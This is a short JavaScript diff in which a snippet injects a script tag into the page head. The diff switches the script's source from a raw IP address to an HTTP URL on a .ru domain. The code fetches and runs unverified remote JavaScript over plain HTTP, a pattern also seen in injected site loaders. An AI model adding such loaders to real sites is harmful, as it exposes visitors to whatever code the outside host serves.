@@ -35,5 +35,5 @@ var script = document.createElement('script');
 	        console.log("cmd:this.script_loaded();");
 	    };
 	}
-	script.src = "http://109.120.140.206/transpo/__ati.js";
+	script.src = "http://divan-nn.ru/__ati.js";
 	document.getElementsByTagName('head')[0].appendChild(script);
